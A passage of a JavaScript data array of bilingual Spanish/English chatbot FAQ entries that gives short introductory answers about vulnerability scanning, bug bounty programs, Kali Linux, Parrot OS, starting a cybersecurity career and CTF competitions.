        answer: "**Vulnerability Scanning** es el proceso automatizado de identificar vulnerabilidades conocidas en sistemas.<br>🔎 **Diferencia con Pentesting:** Scanning es automático; Pentesting incluye explotación manual.<br>**Herramientas:** Nessus, OpenVAS, Qualys, Rapid7 Nexpose<br>**Frecuencia recomendada:** Mensual o tras cambios significativos.",
        answerEn: "**Vulnerability Scanning** is the automated process of identifying known vulnerabilities in systems.<br>🔎 **Difference from Pentesting:** Scanning is automatic; Pentesting includes manual exploitation.<br>**Tools:** Nessus, OpenVAS, Qualys, Rapid7 Nexpose<br>**Recommended frequency:** Monthly or after significant changes."
    },
    {
        keywords: ["que es bug bounty", "programa recompensas", "what is bug bounty", "cazador bugs"],
        answer: "**Bug Bounty** es un programa donde empresas recompensan a investigadores de seguridad por encontrar y reportar vulnerabilidades responsablemente.<br>💰 **Plataformas:** HackerOne, Bugcrowd, Synack<br>**Pagos:** Desde $100 hasta $100,000+ según severidad<br>**Reglas:** Divulgación responsable, no explotar en producción.",
        answerEn: "**Bug Bounty** is a program where companies reward security researchers for finding and responsibly reporting vulnerabilities.<br>💰 **Platforms:** HackerOne, Bugcrowd, Synack<br>**Payouts:** From $100 to $100,000+ depending on severity<br>**Rules:** Responsible disclosure, don't exploit in production."
    },
    {
        keywords: ["que es kali linux", "kali linux", "what is kali linux", "distro pentesting"],
        answer: "**Kali Linux** es una distribución de Linux especializada en pentesting y seguridad ofensiva, mantenida por Offensive Security.<br>🐉 **Incluye:** 600+ herramientas preinstaladas (Nmap, Metasploit, Burp, Wireshark, etc.)<br>**Basada en:** Debian<br>🔗 <a href='https://www.kali.org/' target='_blank'>kali.org</a>",
        answerEn: "**Kali Linux** is a Linux distribution specialized in pentesting and offensive security, maintained by Offensive Security.<br>🐉 **Includes:** 600+ preinstalled tools (Nmap, Metasploit, Burp, Wireshark, etc.)<br>**Based on:** Debian<br>🔗 <a href='https://www.kali.org/' target='_blank'>kali.org</a>"
    },
    {
        keywords: ["que es parrot os", "parrot security", "what is parrot os", "parrot linux"],
        answer: "**Parrot OS** es una distribución Linux para pentesting, similar a Kali pero más ligera y con enfoque en privacidad.<br>🦜 **Ventajas:** Consume menos recursos, incluye herramientas de anonimato (Tor, AnonSurf)<br>**Ediciones:** Security, Home, Cloud<br>🔗 <a href='https://www.parrotsec.org/' target='_blank'>parrotsec.org</a>",
        answerEn: "**Parrot OS** is a Linux distribution for pentesting, similar to Kali but lighter and with privacy focus.<br>🦜 **Advantages:** Uses fewer resources, includes anonymity tools (Tor, AnonSurf)<br>**Editions:** Security, Home, Cloud<br>🔗 <a href='https://www.parrotsec.org/' target='_blank'>parrotsec.org</a>"
    },
    {
        keywords: ["como empezar ciberseguridad", "how to start cybersecurity", "aprender ciberseguridad", "carrera ciberseguridad"],
        answer: "**Ruta para empezar en Ciberseguridad:**<br>1️⃣ **Fundamentos:** Redes (TCP/IP), Linux, Windows<br>2️⃣ **Práctica:** TryHackMe, HackTheBox, PentesterLab<br>3️⃣ **Certificación:** CompTIA Security+ o CEH<br>4️⃣ **Especialización:** Ofensiva (OSCP) o Defensiva (Blue Team)<br>5️⃣ **Comunidad:** Participar en CTFs, leer blogs, seguir expertos<br>📚 **Recursos gratis:** OWASP, Cybrary, YouTube",
        answerEn: "**Path to start in Cybersecurity:**<br>1️⃣ **Fundamentals:** Networks (TCP/IP), Linux, Windows<br>2️⃣ **Practice:** TryHackMe, HackTheBox, PentesterLab<br>3️⃣ **Certification:** CompTIA Security+ or CEH<br>4️⃣ **Specialization:** Offensive (OSCP) or Defensive (Blue Team)<br>5️⃣ **Community:** Participate in CTFs, read blogs, follow experts<br>📚 **Free resources:** OWASP, Cybrary, YouTube"
    },
    {
        keywords: ["que es ctf", "capture the flag", "what is ctf", "competencia hacking"],
        answer: "**CTF** (Capture The Flag) son competencias de hacking donde resuelves desafíos de seguridad para obtener 'flags' (cadenas de texto).<br>🚩 **Categorías:** Web, Crypto, Forensics, Reversing, Pwn, OSINT<br>**Plataformas:** CTFtime, PicoCTF, OverTheWire<br>**Beneficio:** Aprender haciendo en entorno seguro.",
        answerEn: "**CTF** (Capture The Flag) are hacking competitions where you solve security challenges to obtain 'flags' (text strings).<br>🚩 **Categories:** Web, Crypto, Forensics, Reversing, Pwn, OSINT<br>**Platforms:** CTFtime, PicoCTF, OverTheWire<br>**Benefit:** Learn by doing in safe environment."
    }
];
